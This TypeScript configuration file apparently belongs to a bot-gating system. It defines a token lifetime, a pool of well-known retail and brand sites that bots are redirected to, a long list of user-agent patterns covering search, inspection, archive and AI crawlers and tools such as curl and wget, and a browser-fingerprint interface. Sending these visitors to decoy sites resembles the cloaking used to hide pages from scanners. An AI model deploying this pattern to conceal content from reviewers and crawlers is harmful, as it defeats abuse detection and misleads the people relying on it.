export const GATE_TOKEN_TTL_MS = 3 * 60 * 1000;

export const BOT_REDIRECT_POOL = [
  'https://www.amazon.com/',
  'https://www.cloudflare.com/',
  'https://www.arsenal.com/',
  'https://www.temu.com/',
  'https://www.ebay.com/',
  'https://www.alibaba.com/',
  'https://www.target.com/',
  'https://www.walmart.com/',
];

export const BOT_UA_PATTERNS = [
  'googlebot',
  'google-inspectiontool',
  'adsbot-google',
  'mediapartners-google',
  'apis-google',
  'feedfetcher-google',
  'bingbot',
  'bingpreview',
  'msnbot',
  'duckduckbot',
  'baiduspider',
  'yandexbot',
  'sogou',
  'exabot',
  'facebot',
  'facebookexternalhit',
  'twitterbot',
  'linkedinbot',
  'applebot',
  'semrushbot',
  'ahrefsbot',
  'mj12bot',
  'dotbot',
  'petalbot',
  'rogerbot',
  'scrapy/',
  'curl/',
  'wget/',
  'python-requests',
  'python-urllib',
  'httpx/',
  'go-http-client',
  'headlesschrome',
  'phantomjs',
  'selenium',
  'puppeteer',
  'playwright',
  'bytespider',
  'meta-externalagent',
  'gptbot',
  'chatgpt-user',
  'claudebot',
  'anthropic-ai',
  'archive.org_bot',
  'ia_archiver',
  'discordbot',
  'telegrambot',
  'pinterestbot',
  'uptimerobot',
  'postman',
  'insomnia',
  'axios/',
  'node-fetch',
  'libwww-perl',
  'okhttp',
];

export interface ClientSignals {
  userAgent: string;
  webdriver: boolean;
  languages: string[];
  platform: string;
  vendor: string;
  hardwareConcurrency: number;
  maxTouchPoints: number;
  timezone: string;
}
